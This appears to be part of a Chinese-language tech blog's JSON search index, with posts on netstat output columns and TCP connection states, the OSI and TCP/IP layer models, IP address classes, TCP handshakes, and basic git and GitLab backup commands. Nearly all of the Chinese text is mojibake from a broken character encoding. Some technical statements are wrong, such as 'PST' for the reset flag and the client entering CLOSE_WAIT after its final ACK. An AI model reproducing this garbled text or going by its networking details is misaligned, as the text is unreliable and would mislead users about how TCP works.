è¡¨ç¤ºæ”¶åˆ°çš„æ•°æ®å·²ç»åœ¨æœ¬åœ°æ¥æ”¶ç¼“å†²ï¼Œä½†æ˜¯è¿˜æœ‰å¤šå°‘æ²¡æœ‰è¢«è¿›ç¨‹å–èµ°ï¼Œrecv() å¦‚æœæ¥æ”¶é˜Ÿåˆ—Recv-Qä¸€ç›´å¤„äºé˜»å¡çŠ¶æ€ï¼Œå¯èƒ½æ˜¯é­å—äº†æ‹’ç»æœåŠ¡ denial-of-service æ”»å‡»ã€‚ Send-Q: ç½‘è·¯å‘é€é˜Ÿåˆ— å¯¹æ–¹æ²¡æœ‰æ”¶åˆ°çš„æ•°æ®æˆ–è€…è¯´æ²¡æœ‰Ackçš„,è¿˜æ˜¯æœ¬åœ°ç¼“å†²åŒº. å¦‚æœå‘é€é˜Ÿåˆ—Send-Qä¸èƒ½å¾ˆå¿«çš„æ¸…é›¶ï¼Œå¯èƒ½æ˜¯æœ‰åº”ç”¨å‘å¤–å‘é€æ•°æ®åŒ…è¿‡å¿«ï¼Œæˆ–è€…æ˜¯å¯¹æ–¹æ¥æ”¶æ•°æ®åŒ…ä¸å¤Ÿå¿«ã€‚ Recv-Qå’ŒSend-Qé€šå¸¸åº”è¯¥ä¸º0ï¼Œå¦‚æœä¸ä¸º0å¯èƒ½æ˜¯æœ‰é—®é¢˜çš„ã€‚packetsåœ¨ä¸¤ä¸ªé˜Ÿåˆ—é‡Œéƒ½ä¸åº”è¯¥æœ‰å †ç§¯çŠ¶æ€ã€‚å¯æ¥å—çŸ­æš‚çš„é0æƒ…å†µã€‚ Local Address: æœ¬åœ°ç›‘å¬åœ°å€å’Œç«¯å£å· Foreign Address: ä¸æœ¬æœºç«¯å£é€šä¿¡çš„å¤–éƒ¨socketã€‚æ˜¾ç¤ºè§„åˆ™ä¸Local Addressç›¸åŒ State: é“¾è·¯çŠ¶æ€ï¼Œå…±æœ‰11ç§ LISTENï¼š ä¾¦å¬çŠ¶æ€ï¼Œç­‰å¾…è¿œç¨‹æœºå™¨çš„è¿æ¥è¯·æ±‚ã€‚ CLOSED: åˆå§‹ï¼ˆæ— è¿æ¥ï¼‰çŠ¶æ€ã€‚ SYN_SEND: å°è¯•å»ºç«‹ä¸€ä¸ªè¿æ¥,åœ¨TCPä¸‰æ¬¡æ¡æ‰‹æœŸé—´ï¼Œä¸»åŠ¨è¿æ¥ç«¯å‘é€äº†SYNåŒ…åï¼Œè¿›å…¥SYN_SENDçŠ¶æ€ï¼Œç­‰å¾…å¯¹æ–¹çš„ACKåŒ…ã€‚ SYN_RECV: å·²ç»æ¥å—åˆ°äº†ä¸€ä¸ªè¿æ¥è¯·æ±‚,åœ¨TCPä¸‰æ¬¡æ¡æ‰‹æœŸé—´ï¼Œä¸»åŠ¨è¿æ¥ç«¯æ”¶åˆ°SYNåŒ…åï¼Œè¿›å…¥SYN_RECVçŠ¶æ€ã€‚ ESTABLISHED: å·²ç»æœ‰ä¸€ä¸ªæœ‰æ•ˆè¿æ¥ï¼Œå®ŒæˆTCPä¸‰æ¬¡æ¡æ‰‹åï¼Œä¸»åŠ¨è¿æ¥ç«¯è¿›å…¥ESTABLISHEDçŠ¶æ€ã€‚æ­¤æ—¶ï¼ŒTCPè¿æ¥å·²ç»å»ºç«‹ï¼Œå¯ä»¥è¿›è¡Œé€šä¿¡ã€‚ FIN_WAIT_1: ç­‰å¾…è¿œç¨‹TCPçš„è¿æ¥ä¸­æ–­è¯·æ±‚æˆ–å…ˆå‰çš„è¿æ¥ä¸­æ–­è¯·æ±‚çš„ç¡®è®¤ï¼Œåœ¨TCPå››æ¬¡æŒ¥æ‰‹æ—¶ï¼Œä¸»åŠ¨å…³é—­ç«¯å‘é€FINåŒ…åï¼Œè¿›å…¥FIN_WAIT_1çŠ¶æ€ã€‚ FIN_WAIT_2: ä»è¿œç¨‹TCPç­‰å¾…è¿æ¥ä¸­æ–­è¯·æ±‚ ,åœ¨TCPå››æ¬¡æŒ¥æ‰‹æ—¶ï¼Œä¸»åŠ¨å…³é—­ç«¯æ”¶åˆ°ACKåŒ…åï¼Œè¿›å…¥FIN_WAIT_2çŠ¶æ€ã€‚ TIME_WAIT: ç­‰å¾…è¶³å¤Ÿçš„æ—¶é—´ä»¥ç¡®ä¿è¿œç¨‹TCPæ¥æ”¶åˆ°è¿æ¥ä¸­æ–­è¯·æ±‚çš„ç¡®è®¤, åœ¨TCPå››æ¬¡æŒ¥æ‰‹æ—¶ï¼Œä¸»åŠ¨å…³é—­ç«¯å‘é€äº†ACKåŒ…ä¹‹åï¼Œè¿›å…¥TIME_WAITçŠ¶æ€ï¼Œç­‰å¾…æœ€å¤šMSLæ—¶é—´ï¼Œè®©è¢«åŠ¨å…³é—­ç«¯æ”¶åˆ°ACKåŒ…ã€‚ CLOSING: ç­‰å¾…è¿œç¨‹TCPå¯¹è¿æ¥ä¸­æ–­çš„ç¡®è®¤, åœ¨TCPå››æ¬¡æŒ¥æ‰‹æœŸé—´ï¼Œä¸»åŠ¨å…³é—­ç«¯å‘é€äº†FINåŒ…åï¼Œæ²¡æœ‰æ”¶åˆ°å¯¹åº”çš„ACKåŒ…ï¼Œå´æ”¶åˆ°å¯¹æ–¹çš„FINåŒ…ï¼Œæ­¤æ—¶ï¼Œè¿›å…¥CLOSINGçŠ¶æ€ã€‚ CLOSE_WAIT: ç­‰å¾…ä»æœ¬åœ°ç”¨æˆ·å‘æ¥çš„è¿æ¥ä¸­æ–­è¯·æ±‚,åœ¨TCPå››æ¬¡æŒ¥æ‰‹æœŸé—´ï¼Œè¢«åŠ¨å…³é—­ç«¯æ”¶åˆ°FINåŒ…åï¼Œè¿›å…¥CLOSE_WAITçŠ¶æ€ã€‚ LAST_ACKï¼šç­‰å¾…åŸæ¥å‘å‘è¿œç¨‹TCPçš„è¿æ¥ä¸­æ–­è¯·æ±‚çš„ç¡®,åœ¨TCPå››æ¬¡æŒ¥æ‰‹æ—¶ï¼Œè¢«åŠ¨å…³é—­ç«¯å‘é€FINåŒ…åï¼Œè¿›å…¥LAST_ACKçŠ¶æ€ï¼Œç­‰å¾…å¯¹æ–¹çš„ACKåŒ…ã€‚ netstat -i åˆ—è¯´æ˜ Iface: æ¥å£å MTU: ç½‘ç»œæœ€å¤§ä¼ è¾“å•å…ƒ(å­—èŠ‚),å¤§éƒ¨åˆ†ç½‘ç»œè®¾å¤‡éƒ½æ˜¯1500ã€‚å¦‚æœæœ¬æœºçš„MTUæ¯”ç½‘å…³çš„MTUå¤§ï¼Œå¤§çš„æ•°æ®åŒ…å°±ä¼šè¢«æ‹†å¼€æ¥ä¼ é€ï¼Œè¿™æ ·ä¼šäº§ç”Ÿå¾ˆå¤šæ•°æ®åŒ…ç¢ç‰‡ï¼Œå¢åŠ ä¸¢åŒ…ç‡ï¼Œé™ä½ç½‘ç»œé€Ÿåº¦ã€‚æŠŠæœ¬æœºçš„MTUè®¾æˆæ¯”ç½‘å…³çš„MTUå°æˆ–ç›¸åŒï¼Œå°±å¯ä»¥å‡å°‘ä¸¢åŒ… https://www.cnblogs.com/wjoyxt/p/6873714.htmlã€‚ RX-OK/TX-OK: æ­£ç¡®æ¥æ”¶äº†å¤šå°‘æ•°æ®åŒ…ï¼Œå‘é€äº†å¤šå°‘æ•°æ®åŒ… RX-ERR/TX-ERR: æ¥æ”¶ã€å‘é€æ•°æ®åŒ…çš„æ—¶å€™ï¼Œä¸¢å¼ƒäº†å¤šå°‘æ•°æ®åŒ… RX-OVR/TX-OVR: ç”±äºé”™è¯¯é—å¤±äº†å¤šå°‘æ•°æ®åŒ… Flg: æ ‡è®° L: ä»£è¡¨å›ç¯åœ°å€ R: è¿™ä¸ªç½‘ç»œæ¥å£æ­£åœ¨è¿è¡Œä¸­ U: æ¥å£æ­£åœ¨å¤„äºæ´»åŠ¨ä¸­ B: è®¾ç½®äº†å¹¿æ’­åœ°å€ M: æ¥æ”¶æ‰€æœ‰æ•°æ®åŒ… O: è¡¨ç¤ºåœ¨è¯¥æ¥å£ä¸Šç¦æ­¢arp P: ç«¯å¯¹ç«¯çš„è¿æ¥ ","date":"2022-07-05","objectID":"/posts/linux/netstat%E5%91%BD%E4%BB%A4/:0:0","tags":["linux","netstat","tcp"],"title":"Netstatå‘½ä»¤","uri":"/posts/linux/netstat%E5%91%BD%E4%BB%A4/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"OSIä¸ƒå±‚æ¨¡å‹/tcp","date":"2022-07-05","objectID":"/posts/linux/osi%E4%B8%83%E5%B1%82%E6%A8%A1%E5%9E%8B/","tags":["linux","tcp"],"title":"OSIä¸ƒå±‚æ¨¡å‹","uri":"/posts/linux/osi%E4%B8%83%E5%B1%82%E6%A8%A1%E5%9E%8B/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"OSI æ¨¡å‹æ˜¯ä»ä¸Šå¾€ä¸‹çš„ï¼Œè¶Šåº•å±‚è¶Šæ¥è¿‘ç¡¬ä»¶ï¼Œè¶Šå¾€ä¸Šè¶Šæ¥è¿‘è½¯ä»¶ï¼Œè¿™ä¸ƒå±‚æ¨¡å‹åˆ†åˆ«æ˜¯ç‰©ç†å±‚ã€æ•°æ®é“¾è·¯å±‚ã€ç½‘ç»œå±‚ã€ä¼ è¾“å±‚ã€ä¼šè¯å±‚ã€è¡¨ç¤ºå±‚ã€åº”ç”¨å±‚ ç‰©ç†å±‚: åœ¨åª’ä½“ä¸Šä¼ è¾“æ¯”ç‰¹ï¼Œæä¾›æœºæ¢°çš„å’Œç”µæ°”çš„è§„çº¦ æ•°æ®é“¾è·¯å±‚: å°†åˆ†ç»„æ•°æ®å°è£…æˆå¸§ï¼Œæä¾›èŠ‚ç‚¹åˆ°èŠ‚ç‚¹æ–¹å¼çš„ä¼ è¾“ ç½‘ç»œå±‚: å°†åˆ†ç»„ä»æºç«¯ä¼ é€åˆ°ç›®çš„ç«¯ï¼Œæä¾›ç½‘ç»œäº’è” ä¼ è¾“å±‚: æä¾›å¯é çš„ç«¯åˆ°ç«¯çš„æŠ¥æ–‡ä¼ è¾“å’Œå·®é”™æ§åˆ¶ ä¼šè¯å±‚: å»ºç«‹ã€ç®¡ç†å’Œç»ˆæ­¢ä¼šè¯ è¡¨ç¤ºå±‚: å¯¹æ•°æ®è¿›è¡Œè½¬æ¢ã€åŠ å¯†å’Œå‹ç¼© åº”ç”¨å±‚: ç¨‹åºåŠæ¥å£ OSIä¸ƒå±‚æ¨¡å‹ TCP/IP4å±‚æ¨¡å‹ åŠŸèƒ½ TCP/IPåè®®ç°‡ åº”ç”¨å±‚ åº”ç”¨å±‚ æ–‡ä»¶ä¼ è¾“ã€é‚®ä»¶ã€æ–‡ä»¶å…±äº«ã€è™šæ‹Ÿç»ˆç«¯ã€webã€åŸŸåæœåŠ¡ TFTPã€HTTPã€SMTPã€DNSã€TELNET è¡¨ç¤ºå±‚ åº”ç”¨å±‚ æ•°æ®æ ¼å¼åŒ–ã€ä»£ç è½¬åŒ–ã€æ•°æ®åŠ å¯† æ²¡æœ‰åè®® ä¼šè¯å±‚ åº”ç”¨å±‚ è§£é™¤æˆ–å»ºç«‹ä¸åˆ«çš„èŠ‚ç‚¹çš„ä¼šè¯å…³ç³» æ²¡æœ‰åè®® ä¼ è¾“å±‚ ä¼ è¾“å±‚ æä¾›ç«¯å¯¹ç«¯çš„æ¥å£ TCPã€UDP ç½‘ç»œå±‚ ç½‘ç»œå±‚ ä¸ºæ•°æ®åŒ…é€‰æ‹©è·¯ç”±(è·¯ç”±å™¨) IPã€ICMPã€RIPã€OSPFã€BGPã€IGMP æ•°æ®é“¾è·¯å±‚ é“¾è·¯å±‚ ä¼ è¾“æœ‰åœ°å€çš„å¸§åŠé”™è¯¯æ£€æµ‹åŠŸèƒ½ SLIPã€CSLIPã€PPPã€ARPã€RARPã€MTU(äº¤æ¢æœº) ç‰©ç†å±‚ é“¾è·¯å±‚ ä»¥äºŒè¿›åˆ¶æ•°æ®å½¢å¼åœ¨ç‰©ç†åª’ä»‹ä¸Šä¼ è¾“æ•°æ®(å…‰çº¤ã€æ™®é€šç½‘çº¿ã€æ— çº¿ä¿¡å·) ISO2110ã€IEEE802ã€IEEE802.2 OSIæ¨¡å‹ å…¨æµç¨‹èŒè´£ å½“ä½ è¾“â¼Šâ¼€ä¸ªâ½¹å€å¹¶æŒ‰ä¸‹å›â»‹é”®çš„æ—¶å€™ï¼Œâ¾¸å…ˆï¼Œåº”â½¤å±‚åè®®å¯¹è¯¥è¯·æ±‚åŒ…åšäº†æ ¼å¼å®šä¹‰ï¼›ç´§æ¥ç€ä¼  è¾“å±‚åè®®åŠ ä¸Šäº†åŒâ½…çš„ç«¯â¼å·ï¼Œç¡®è®¤äº†åŒâ½…é€šä¿¡çš„åº”â½¤ç¨‹åºï¼›ç„¶åâ½¹ç»œåè®®åŠ ä¸Šäº†åŒâ½…çš„IPåœ° å€ï¼Œç¡®è®¤äº†åŒâ½…çš„â½¹ç»œä½ç½®ï¼›æœ€åé“¾è·¯å±‚åè®®åŠ ä¸Šäº†åŒâ½…çš„MACåœ°å€ï¼Œç¡®è®¤äº†åŒâ½…çš„ç‰©ç†ä½ç½®ï¼Œ åŒæ—¶å°†æ•°æ®è¿›â¾åˆ†ç»„ï¼Œå½¢æˆæ•°æ®å¸§ï¼Œé‡‡â½¤â¼´æ’­â½…å¼ï¼Œé€šè¿‡ä¼ è¾“ä»‹è´¨å‘é€ç»™å¯¹â½…ä¸»æœºã€‚â½½å¯¹äºä¸åŒ â½¹æ®µï¼Œè¯¥æ•°æ®åŒ…â¾¸å…ˆä¼šè½¬å‘ç»™â½¹å…³è·¯ç”±å™¨ï¼Œç»è¿‡å¤šæ¬¡è½¬å‘åï¼Œæœ€ç»ˆè¢«å‘é€åˆ°â½¬æ ‡ä¸»æœºã€‚â½¬æ ‡æœºæ¥ æ”¶åˆ°æ•°æ®åŒ…åï¼Œé‡‡â½¤å¯¹åº”çš„åè®®ï¼Œå¯¹å¸§æ•°æ®è¿›â¾ç»„è£…ï¼Œç„¶åå†é€šè¿‡â¼€å±‚â¼€å±‚çš„åè®®è¿›â¾è§£æï¼Œæœ€ ç»ˆè¢«åº”â½¤å±‚çš„åè®®è§£æå¹¶äº¤ç»™æœåŠ¡å™¨å¤„ç†ã€‚ é“¾è·¯å±‚: å¯¹0å’Œ1è¿›è¡Œåˆ†ç»„ï¼Œå®šä¹‰æ•°æ®å¸§ï¼Œç¡®è®¤ä¸»æœºçš„ç‰©ç†åœ°å€ï¼Œä¼ è¾“æ•°æ®ï¼› ç½‘ç»œå±‚: å®šä¹‰IPåœ°å€ï¼Œç¡®è®¤ä¸»æœºæ‰€åœ¨çš„ç½‘ç»œä½ç½®ï¼Œå¹¶é€šè¿‡IPè¿›è¡Œmacå¯»å€ï¼Œå¯¹å¤–ç½‘æ•°æ®åŒ…è¿›è¡Œè·¯ç”±è½¬å‘ã€‚ ä¼ è¾“å±‚: å®šä¹‰ç«¯å£ï¼Œç¡®è®¤ä¸»æœºä¸Šåº”ç”¨ç¨‹åºèº«ä»½ï¼Œå¹¶å°†æ•°æ®åŒ…äº¤ç»™å¯¹åº”çš„åº”ç”¨ç¨‹åºã€‚ åº”ç”¨å±‚: å®šä¹‰æ•°æ®æ ¼å¼ï¼Œå¹¶æŒ‰ç…§å¯¹åº”çš„æ•°æ®æ ¼å¼è§£è¯»æ•°æ®ã€‚ ä¸€æ¡æ¶ˆæ¯å¦‚ä½•å‘é€åˆ°ç›®æ ‡ç”µè„‘ä¸Šçš„ åº”ç”¨å±‚å½•å…¥æ¶ˆæ¯hello(å†™ä¿¡) ä¼ è¾“å±‚é™„åŠ TCPåŒ…é¦–éƒ¨(è£…å…¥ä¿¡å°) ç½‘ç»œå±‚é™„åŠ IPåŒ…é¦–éƒ¨(å†™å…¥åœ°å€å’Œé‚®ç¼–) IPæ•°æ®åŒ…:é¦–éƒ¨(20å­—èŠ‚:åŒ…å«ç‰ˆæœ¬ã€é¦–éƒ¨é•¿åº¦ã€åŒºåˆ†æœåŠ¡ã€æ€»é•¿åº¦ã€æ ‡è¯†ã€æ ‡å¿—ã€ç‰‡åç§»ã€ç”Ÿå­˜æ—¶é—´ã€åè®®ã€é¦–éƒ¨æ ¡éªŒã€æºåœ°å€ã€ç›®æ ‡åœ°å€ã€å¯é€‰å­—æ®µã€å¡«å……ã€æ•°æ®éƒ¨åˆ†) + æ•°æ®(æœ€å¤§65515å­—èŠ‚) æ•°æ®é“¾è·¯å±‚é™„åŠ ä»¥å¤ªåŒ…é¦–éƒ¨(é‚®ç¥¨å’Œé‚®ç« ) ä»¥å¤ªç½‘åè®®: ä¸€ç»„ç”µä¿¡å·å°±æ˜¯ä¸€ä¸ªæ•°æ®åŒ…ï¼Œä¸€ä¸ªæ•°æ®åŒ…åˆè¢«ç§°ä¸ºä¸€å¸§ ä»¥å¤ªç½‘åŒ…,åŒ…å«ç›®æ ‡macã€æºmacåœ°å€ ç‰©ç†å±‚ä¼ é€šè¿‡å…‰ç¼†å°†æ•°æ®è¾“è‡³ç›®æ ‡(é‚®è½¦è½¬ç§») æ•°æ®é“¾è·¯å±‚æ‹†è§£ä»¥å¤ªåŒ…é¦–éƒ¨ ç½‘ç»œå±‚æ‹†è§£IPåŒ…é¦–éƒ¨ ä¼ è¾“å±‚æ‹†è§£TCPåŒ…é¦–éƒ¨ åº”ç”¨å±‚æ¥æ”¶æ¶ˆæ¯ ç½‘ç»œåœ°å€åˆ†ç±» ç‰¹æ®ŠBç±»åœ°å€ç½‘æ®µ: 169.254.0.0/16, ç”¨äºå¤„ç†DHCPåˆ†é…å¤±è´¥æˆ–æ²¡æœ‰DHCPæœåŠ¡çš„æƒ…å†µ å…±æœ‰åœ°å€ Aç±»: 1.0.0.0-126.0.0.0,é»˜è®¤å­ç½‘æ©ç :255.0.0.0 ,ç¬¬ä¸€ä¸ªå­—èŠ‚ä¸ºç½‘ç»œå·ï¼Œåä¸‰ä¸ªå­—èŠ‚ä¸ºä¸»æœºå·ã€‚è¯¥ç±»ipåœ°å€çš„æœ€å‰é¢ä¸º0,æ‰€ä»¥åœ°å€çš„ç½‘ç»œå·å–å€¼äº1-126ä¹‹é—´ã€‚ä¸€èˆ¬ç”¨äºå¤§å‹ç½‘ç»œã€‚ Bç±»: 128.0.0.0-191.255.0.0,é»˜è®¤å­ç½‘æ©ç :255.255.0.0ï¼Œå‰ä¸¤ä¸ªå­—èŠ‚æœªç½‘ç»œå·ï¼Œåä¸¤ä¸ªå­—èŠ‚ä¸ºä¸»æœºå·ï¼Œè¯¥ç±»IP åœ°å€çš„æœ€å‰é¢ä¸º10,æ‰€ä»¥åœ°å€çš„ç½‘ç»œå·å–å€¼äº128-191ä¹‹é—´ï¼Œä¸€èˆ¬ç”¨äºä¸­ç­‰è§„æ¨¡ç½‘ç»œã€‚ Cç±»: 192.0.0.0-223.255.255.0,é»˜è®¤å­ç½‘æ©ç : 255.255.255.0 ,å‰ä¸‰ä¸ªå­—èŠ‚ä¸ºç½‘ç»œå·ï¼Œæœ€åä¸€ä¸ªå­—èŠ‚ä¸ºä¸»æœºå·ï¼Œè¯¥ç±»IPåœ°å€çš„æœ€å‰é¢ä¸º110,æ‰€ä»¥åœ°å€çš„ç½‘ç»œå·å–å€¼äº192-223ä¹‹é—´ï¼Œä¸€èˆ¬ç”¨äºå°å‹ç½‘ç»œ. Dç±»: æ˜¯å¤šæ’­åœ°å€ï¼Œè¯¥ç±»IPåœ°å€çš„æœ€å‰é¢ä¸º1110,æ‰€ä»¥åœ°å€çš„ç½‘ç»œå·å–å€¼äº224-239ä¹‹é—´ï¼Œä¸€èˆ¬ç”¨äºå¤šè·¯å¹¿æ’­ç”¨æˆ·ã€‚ Eç±»: æ˜¯ä¿ç•™åœ°å€ã€‚è¯¥ç±»IPåœ°å€çš„æœ€å‰é¢ä¸º1111,æ‰€ä»¥åœ°å€çš„ç½‘ç»œå·å–å€¼äº240-255ä¹‹é—´ã€‚ ç§æœ‰åœ°å€ Aç±»: 10.0.0.0-10.255.255.255 Bç±»: 172.16.0.0-172.31.255.255 Cç±»: 192.168.0.0-192.168.255.255 TCP åŒ…å¸¸è§æ ‡è¯† SYN: è¡¨ç¤ºå»ºç«‹è¿æ¥ FIN: è¡¨ç¤ºå…³é—­è¿æ¥ ACK: è¡¨ç¤ºå“åº” PSH: è¡¨ç¤ºæœ‰dataæ•°æ®ä¼ è¾“ PST: è¡¨ç¤ºè¿æ¥é‡ç½® ä¸‰æ¬¡æ¡æ‰‹ å®¢æˆ·ç«¯å‘é€SYNåˆ°æœåŠ¡å™¨ç«¯è¡¨ç¤ºå‡†å¤‡å»ºç«‹è¿æ¥ï¼ŒæœåŠ¡ç«¯å“åº”å‘é€SYN+ACKäºå®¢æˆ·ç«¯è¡¨ç¤ºå‡†å¤‡å»ºç«‹è¿æ¥è¯·æ±‚ï¼Œå®¢æˆ·ç«¯å‘é€ACKå“åº”è¡¨ç¤ºå¼€å§‹ä¼ è¾“æ•°æ® å››æ¬¡æŒ¥æ‰‹ å®¢æˆ·ç«¯å‘é€FINè¯·æ±‚åˆ°æœåŠ¡ç«¯è¡¨ç¤ºå‡†å¤‡æ–­å¼€è¿æ¥ï¼ŒåŒæ—¶è¿›å…¥FIN_WAIT_1çŠ¶æ€ä¸‹ï¼ŒæœåŠ¡ç«¯æ¥æ”¶åˆ°FINåå‘é€ACKäºå®¢æˆ·ç«¯è¡¨ç¤ºæ¥æ”¶åˆ°äº†å‡†å¤‡æ–­å¼€çš„å“åº”è¯·æ±‚ï¼ŒåŒæ—¶è¿›å…¥CLOSE_WAIT,å®¢æˆ·ç«¯æ¥æ”¶åˆ°äº†ACKåŒæ—¶è¿›å…¥FIN_WAIT_2ï¼ŒæœåŠ¡ç«¯å†æ¬¡å‘é€FIN+ACKäºå®¢æˆ·ç«¯è¡¨ç¤ºæˆ‘ä¹Ÿå‡†å¤‡æ–­å¼€è¯·æ±‚äº†ï¼ŒåŒæ—¶æœåŠ¡ç«¯è¿›å…¥LAST_ACK,å®¢æˆ·ç«¯åœ¨æ¥æ”¶åˆ°FIN+ACKåå‘é€ACKåˆ°æœåŠ¡ç«¯ï¼Œè¡¨ç¤ºæˆ‘å·²ç»æ¥æ”¶åˆ°æœåŠ¡ç«¯ç¡®è®¤å¹¶å‡†å¤‡å…³é—­è¿æ¥ï¼ŒæœåŠ¡ç«¯æ¥æ”¶åˆ°å®¢æˆ·ç«¯ACKåç›´æ¥å…³é—­ï¼Œå®¢æˆ·ç«¯åœ¨å‘é€åè¿›å…¥CLOSE_WAITå¹¶ç­‰å¾…2ä¸ªæŠ¥æ–‡é•¿åº¦æ—¶é—´(é»˜è®¤30ç§’)åå…³é—­è¿æ¥ã€‚ ","date":"2022-07-05","objectID":"/posts/linux/osi%E4%B8%83%E5%B1%82%E6%A8%A1%E5%9E%8B/:0:0","tags":["linux","tcp"],"title":"OSIä¸ƒå±‚æ¨¡å‹","uri":"/posts/linux/osi%E4%B8%83%E5%B1%82%E6%A8%A1%E5%9E%8B/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"æŒç»­é›†æˆ","date":"2022-07-05","objectID":"/posts/linux/%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90/","tags":["linux","git","devops"],"title":"æŒç»­é›†æˆ","uri":"/posts/linux/%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"æŒç»­é›†æˆ ä»€ä¹ˆæ˜¯DevOps DevOps æ˜¯ä¸€ä¸ªæ¡†æ¶ï¼Œæ˜¯ä¸€ç§ç†è®ºæ–¹æ³•ï¼Œå¹¶ä¸æ˜¯ä¸€å¥—å·¥å…·ï¼Œä»–åŒ…æ‹¬ä¸€ç³»åˆ—çš„åŸºæœ¬åŸåˆ™å’Œå®è·µã€‚å…¶æ ¸å¿ƒä»·å€¼ç€é‡äºæ›´å¿«é€Ÿçš„äº¤ä»˜ï¼Œå“åº”å¸‚åœºçš„å˜åŒ–ã€‚æ›´å¤šçš„å…³æ³¨ä¸šåŠ¡çš„æ”¹è¿›ä¸æå‡ã€‚ git å·¥ä½œç›®å½•-æš‚å­˜åŒºåŸŸ(git add)-æœ¬åœ°ä»“åº“(git commit)-è¿œç¨‹ä»“åº“(git push) åˆå§‹é…ç½® $\u003e git config --global user.name 0x5c0f $\u003e git config --global user.email mail@0x5c0f.cc $\u003e cat ~/.gitconfig # ç³»ç»Ÿå±‚é¢ä½äº/etc/ ä¸‹ ; é¡¹ç›®å±‚é¢ï¼Œé¡¹ç›®æ ¹ç›®å½• [user] name = 0x5c0f email = mail@0x5c0f.cc $\u003e git config --list user.name=0x5c0f user.email=mail@0x5c0f.cc åˆå§‹é¡¹ç›® åŸºç¡€æ“ä½œ $\u003e mkdir /data/gittest -p \u0026\u0026 cd /data/gittest $\u003e git init $\u003e tree -a . â””â”€â”€ .git â”œâ”€â”€ branches â”œâ”€â”€ config â”œâ”€â”€ description â”œâ”€â”€ HEAD â”œâ”€â”€ hooks ...... â”œâ”€â”€ objects â”‚Â â”œâ”€â”€ info â”‚Â â””â”€â”€ pack ...... # ç§»é™¤ç¼“å†²åŒºæ–‡ä»¶ $\u003e git rm --cached \u003cfile\u003e # ç§»é™¤æœ¬åœ°åŠç¼“å†²åŒºæ–‡ä»¶ $\u003e git rm -f \u003cfile\u003e # é‡å‘½å $\u003e mv \u003cfile\u003e \u003cfile\u003e.txt $\u003e git rm --cached \u003cfile\u003e $\u003e git add \u003cfile\u003e.txt # git commit -m \"\" # æŸ¥çœ‹ä¿®æ”¹è¯¦æƒ… $\u003e git diff \u003cfile\u003e # æŸ¥çœ‹æäº¤å†å² $\u003e git log # æŸ¥çœ‹æäº¤å†å²(ç²¾ç®€) $\u003e git log --oneline # æ’¤å›ä¿®æ”¹æ–‡ä»¶(æœªaddæ—¶) $\u003e git checkout -- \u003cfile\u003e # æ’¤å›ä¿®æ”¹æ–‡ä»¶(æœªcommitæ—¶) $\u003e git reset HEAD \u003cfile\u003e # git checkout -- \u003cfile\u003e # æ’¤å›ä¿®æ”¹æ–‡ä»¶(æœªpushæ—¶) $\u003e git reset --hard \u003ccommitid\u003e # æŸ¥çœ‹å†å²æ“ä½œè®°å½• # æ­¤å‘½ä»¤å¤§ä½“æ‰§è¡Œåœ¨git reset --hard \u003ccommitid\u003e ä¹‹åï¼Œå› ä¸ºæ‰§è¡Œäº†git reset --hard \u003ccommitid\u003eåï¼Œgit logå°†ä¸å†çœ‹åˆ°commitidä¹‹åçš„æ‰€æœ‰æäº¤è®°å½• $\u003e git reflog åˆ†æ”¯ åˆ†æ”¯åˆ›å»ºåï¼Œç›´æ¥å¢åˆ ï¼Œå„ä¸ªåˆ†æ”¯ä¸å—å½±å“ # åˆ›å»ºåˆ†æ”¯ $\u003e git branch test01 # åˆ é™¤ git branch -d test01 # æŸ¥çœ‹åˆ†æ”¯ $\u003e git branch * master test01 # åˆ‡æ¢åˆ†æ”¯ $\u003e git checkout test01 # git status # git log --oneline --decorate # åˆå¹¶åˆ†æ”¯(æ¯”å¦‚ï¼šåˆå¹¶test01åˆ°masterä¸­ï¼Œåˆ™å½“å‰éœ€è¦åˆ‡æ¢åˆ°masterä¸­æ‰§è¡Œ) # å½“ä¸¤ä¸ªåˆ†æ”¯ä¸­ï¼ŒåŒæ—¶ä¿®æ”¹äº†ä¸€ä¸ªæ–‡ä»¶ï¼Œåˆ™ä¼šå‡ºç°åˆå¹¶å†²çªï¼Œæ­¤æ—¶éœ€è¦æ‰‹åŠ¨å¤„ç†å†²çªæ–‡ä»¶ $\u003e git merge test01 æ ‡ç­¾ æ ‡ç­¾å¯ä»¥ä½œä¸ºä¸€ä¸ªcommitidçš„æƒŸä¸€æ ‡è®°ï¼Œç›¸å½“äºç»™commitidå–çš„åˆ«åå§ # ç»™å½“å‰commitåˆ›å»ºæ ‡ç­¾ $\u003e git tag v1.0 # git tag -a v1.0 # -a: æ‰“å¼€æ³¨é‡Šç¼–è¾‘é¡µé¢ å¯ä½¿ç”¨-m \"message\"æ›¿ä»£ # é’ˆå¯¹ç‰¹å®šcommitæ‰“æ ‡ç­¾ $\u003e git tag v1.0 \u003ccommitid\u003e # æŸ¥çœ‹æ‰€æœ‰æ ‡ç­¾ $\u003e git tag # æŸ¥çœ‹å½“å‰æ ‡ç­¾çš„è¯¦ç»†ä¿¡æ¯ $\u003e git show v1.0 # åˆ é™¤æ ‡ç­¾ $\u003e git tag -d v1.0 # é‡ç½®åˆ°æŸä¸ªæ ‡ç­¾(æäº¤ç‚¹) $\u003e git reset --hard v1.0 # or git reset --hard \u003ccommit\u003e è¿œç¨‹æ¨é€(gitlab) $\u003e git remote add origin http://xxxxxxx/xxx.git $\u003e git push -u origin master ## gitlab å¤‡ä»½(/etc/gitlab.rb) # å¤‡ä»½è·¯å¾„ gitlab_rails['backup_path'] = '/data/backup' # å¤‡ä»½ä¿ç•™æ—¶é—´(ç§’) gitlab_rails['backup_keep_time'] = 604800 # æ‰§è¡Œå¤‡ä»½ $\u003e /usr/bin/gitlab-rake gitlab:backup:create # æ•°æ®æ¢å¤ # åœæ­¢æ•°æ®å†™å…¥æœåŠ¡ $\u003e gitlab-ctl stop unicorn $\u003e gitlab-ctl stop sidekiq $\u003e gitlab-rake gitlab:backup:restore BACKUP=\u003cå¤‡ä»½æ–‡ä»¶çš„æ•°å­—éƒ¨åˆ†\u003e # å›è½¦ä¸€è·¯yes $\u003e gitlab-ctl restart 